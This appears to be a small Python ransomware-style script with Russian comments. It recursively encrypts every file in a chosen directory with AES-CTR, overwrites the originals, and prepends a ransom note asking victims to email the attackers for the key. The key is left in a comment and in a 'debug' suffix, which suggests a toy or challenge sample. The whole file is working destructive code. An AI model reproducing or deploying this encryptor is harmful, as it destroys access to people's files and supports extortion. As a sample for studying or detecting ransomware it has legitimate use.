import os
import pyaes

# hsibmawh02jmdkgk.
PREFIX = b"HAHAHAHA!!!! DATA IS ENCRYPTED TO GET KEY CONTACT US AT FL0PPA_H4CK3RS_324243@GMAIL.COM\nTHERE IS NO WAY TO DECRYPT THIS WITHOUT A KEY HAHAHAHAH!!!!" + b"ENCRYPTED\n" * 1000
SUFFIX = b"This is example encrypter program by Peter. Downloaded from github.com - Debug mode is on, cipher: AES, mode: CTR, used key: hsibmawh02jmdkgk. " + b"ENCRYPTED\n" * 1000


def encrypt_file(key, file_path):
    with open(file_path, 'rb') as infile:
        file_data = infile.read()
    aes = pyaes.AESModeOfOperationCTR(key)
    encrypted_data = aes.encrypt(file_data)
    # добавление меток
    encrypted_data_with_markers = PREFIX + encrypted_data + SUFFIX
    with open(file_path, 'wb') as outfile:
        outfile.write(encrypted_data_with_markers)


def decrypt_file(key, file_path):
    with open(file_path, 'rb') as infile:
        encrypted_data_with_markers = infile.read()
        
    # тут откидываем метки
    if encrypted_data_with_markers.startswith(PREFIX) and encrypted_data_with_markers.endswith(SUFFIX):
        encrypted_data = encrypted_data_with_markers[len(PREFIX):-len(SUFFIX)]
    else:
        print("Ошибка: файл не содержит ожидаемые маркеры.")
        return
    aes = pyaes.AESModeOfOperationCTR(key)
    decrypted_data = aes.decrypt(encrypted_data)
    with open(file_path, 'wb') as outfile:
        outfile.write(decrypted_data)

def get_user_input():
    mode = input("Режим (encrypt/decrypt): ").strip()
    dir_path = input("Директория: ").strip()
    key_string = input("Введите ключ (16/24/32 символов): ").strip()
    return mode, dir_path, key_string

def main():
    mode, dir_path, key_string = get_user_input()
    key = key_string.encode("utf-8")

    if len(key) not in [16, 24, 32]:
        print("Ключ должен быть длиной 16, 24, или 32 байта")
        return
    
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            print(f"Обработка {file_path}...")
            if mode == "encrypt":
                encrypt_file(key, file_path)
            elif mode == "decrypt":
                decrypt_file(key, file_path)
            else:
                print("Неверный режим, выберите 'encrypt' или 'decrypt'")
                return

if __name__ == "__main__":
    main()
